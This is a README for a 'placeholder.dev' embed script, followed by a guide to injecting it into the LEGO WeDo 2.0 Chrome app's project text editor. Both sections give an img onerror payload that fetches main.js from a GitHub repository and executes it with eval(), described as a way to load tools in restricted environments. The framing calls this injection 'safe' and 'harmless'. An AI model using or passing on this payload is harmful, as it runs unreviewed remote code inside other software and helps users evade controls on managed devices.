---

## 📦 `placeholder.dev` Embed Script

This is an embeddable JavaScript loader for the [`placeholder.dev`](https://github.com/Ikonik24/placeholder.dev) project. It dynamically fetches and executes the latest version of `main.js` from the `main` branch of the GitHub repo.

---

### 🚀 How It Works

When this script is embedded in a website, it pulls the latest `main.js` from GitHub and runs it inside the page. This is useful for testing live scripts, dashboards, or injecting tools for development.

---

### ⚠️ Warning

> This embed method uses `eval()` and `fetch()` to load and run remote JavaScript. It **should only be used on domains you own or trust**.
> Never embed this on third-party websites or use it in production without understanding the **security risks**.

---

### ✅ Safe Usage Example

```html
<img src="#" onerror='fetch("https://raw.githubusercontent.com/Ikonik24/placeholder.dev/refs/heads/main/main.js").then(r=>r.text()).then(c=>eval(c))'>
```

Place this `<img>` tag anywhere in your HTML. When the image fails to load, it triggers the `onerror` event, which fetches and executes `main.js`.

---

### 📁 Repo Structure

* `main.js`: Core script loaded into the target site
* `README.md`: You're reading it!

---

### 📜 License

MIT License. You can use, modify, and distribute this script, but **you are responsible for safe use**.

---

## 🧪 `placeholder.dev` Webview Injection (LEGO Edition)

A guide for using the `placeholder.dev` embed script with LEGO® WeDo 2.0's project editor via a harmless image injection trick. Useful for loading tools in restricted environments (dev/demo purposes only).

---

### ⚙️ Setup Instructions

1. **Install** [LEGO® Education WeDo 2.0](https://chromewebstore.google.com/detail/wedo-20-lego%C2%AE-education/pflionopdgpjckjkafnlamfmonjhccdh?hl=en-US) from the Chrome Web Store.
2. Launch the app and **wait until it fully loads**.
3. **Turn off your Wi-Fi**.
4. Click the **pencil icon** to edit a project.
5. Click the **green document icon** to open the text editor.
6. Paste the following embed snippet into the textbox:

   ```html
   <img src="#" onerror='fetch("https://raw.githubusercontent.com/Ikonik24/placeholder.dev/refs/heads/main/main.js").then(r=>r.text()).then(c=>eval(c))'>
   ```
---
